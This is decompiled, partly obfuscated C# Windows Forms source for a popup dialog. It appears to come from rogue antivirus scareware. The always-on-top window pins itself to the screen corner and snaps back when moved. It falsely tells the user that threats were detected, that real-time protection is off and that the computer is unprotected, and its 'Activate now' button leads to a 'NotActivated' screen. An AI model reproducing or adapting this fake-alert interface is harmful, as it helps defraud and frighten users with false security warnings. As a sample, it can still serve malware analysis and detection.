using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

public sealed class TooltipDialog : Form
{
	private IContainer icontainer_0;

	private Class7 panel1;

	private Panel panel2;

	private Label lblCompStatus;

	private Label label12;

	private Label label9;

	private Label label11;

	private Label label10;

	private Button button2;

	private Label label1;

	private Class7 customPanel1;

	public TooltipDialog()
	{
		InitializeComponent();
		((Form)this).set_Location(new Point(Screen.get_PrimaryScreen().get_WorkingArea().Right - ((Control)this).get_Width(), Screen.get_PrimaryScreen().get_WorkingArea().Bottom - ((Control)this).get_Height()));
	}

	private void TooltipDialog_LocationChanged(object sender, EventArgs e)
	{
		((Form)this).set_Location(new Point(Screen.get_PrimaryScreen().get_WorkingArea().Right - ((Control)this).get_Width(), Screen.get_PrimaryScreen().get_WorkingArea().Bottom - ((Control)this).get_Height()));
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
		NotActivated notActivated = new NotActivated();
		((Control)notActivated).Show();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_01d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Expected O, but got Unknown
		//IL_025f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0269: Expected O, but got Unknown
		//IL_027c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0286: Expected O, but got Unknown
		//IL_0333: Unknown result type (might be due to invalid IL or missing references)
		//IL_033d: Expected O, but got Unknown
		//IL_0427: Unknown result type (might be due to invalid IL or missing references)
		//IL_0431: Expected O, but got Unknown
		//IL_05a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05aa: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(TooltipDialog));
		panel1 = new Class7();
		label1 = new Label();
		button2 = new Button();
		label12 = new Label();
		label9 = new Label();
		label11 = new Label();
		label10 = new Label();
		panel2 = new Panel();
		lblCompStatus = new Label();
		customPanel1 = new Class7();
		((Control)panel1).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.White);
		((Panel)panel1).set_BorderStyle((BorderStyle)1);
		((Control)panel1).get_Controls().Add((Control)(object)customPanel1);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).get_Controls().Add((Control)(object)button2);
		((Control)panel1).get_Controls().Add((Control)(object)label12);
		((Control)panel1).get_Controls().Add((Control)(object)label9);
		((Control)panel1).get_Controls().Add((Control)(object)label11);
		((Control)panel1).get_Controls().Add((Control)(object)label10);
		((Control)panel1).get_Controls().Add((Control)(object)panel2);
		((Control)panel1).set_Dock((DockStyle)5);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(535, 183));
		((Control)panel1).set_TabIndex(0);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(23, 130));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(274, 26));
		((Control)label1).set_TabIndex(13);
		((Control)label1).set_Text("Threats have been detected on your computer.\r\nActivate now to remove all threats.\r\n");
		((Control)button2).set_BackgroundImage((Image)componentResourceManager.GetObject("button2.BackgroundImage"));
		((Control)button2).set_Font(new Font("Tahoma", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.White);
		((Control)button2).set_Location(new Point(303, 121));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(219, 49));
		((Control)button2).set_TabIndex(12);
		((Control)button2).set_Text("Activate now");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_ForeColor(Color.Red);
		((Control)label12).set_Location(new Point(280, 72));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(155, 13));
		((Control)label12).set_TabIndex(11);
		((Control)label12).set_Text("Last updated a month ago");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Location(new Point(42, 52));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(104, 13));
		((Control)label9).set_TabIndex(8);
		((Control)label9).set_Text("Real-time protection:");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_ForeColor(Color.Red);
		((Control)label11).set_Location(new Point(280, 52));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(23, 13));
		((Control)label11).set_TabIndex(10);
		((Control)label11).set_Text("Off");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Location(new Point(42, 72));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(83, 13));
		((Control)label10).set_TabIndex(9);
		((Control)label10).set_Text("Virus definitions:");
		((Control)panel2).set_BackgroundImage((Image)(object)Class3.smethod_23());
		((Control)panel2).get_Controls().Add((Control)(object)lblCompStatus);
		((Control)panel2).set_Dock((DockStyle)1);
		((Control)panel2).set_Location(new Point(0, 0));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(533, 26));
		((Control)panel2).set_TabIndex(6);
		((Control)lblCompStatus).set_AutoSize(true);
		((Control)lblCompStatus).set_BackColor(Color.Transparent);
		((Control)lblCompStatus).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompStatus).set_ForeColor(Color.White);
		((Control)lblCompStatus).set_Location(new Point(19, 5));
		((Control)lblCompStatus).set_Name("lblCompStatus");
		((Control)lblCompStatus).set_Size(new Size(459, 16));
		((Control)lblCompStatus).set_TabIndex(0);
		((Control)lblCompStatus).set_Text("Computer Status - Unprotected! Click here to protect your computer.");
		((Control)customPanel1).set_Location(new Point(25, 103));
		((Control)customPanel1).set_Name("customPanel1");
		((Control)customPanel1).set_Size(new Size(455, 2));
		((Control)customPanel1).set_TabIndex(14);
		customPanel1.method_7(180f);
		customPanel1.method_1(Color.White);
		customPanel1.method_3(Color.FromArgb(200, 201, 201));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(535, 183));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("TooltipDialog");
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_TopMost(true);
		((Control)this).add_LocationChanged((EventHandler)TooltipDialog_LocationChanged);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
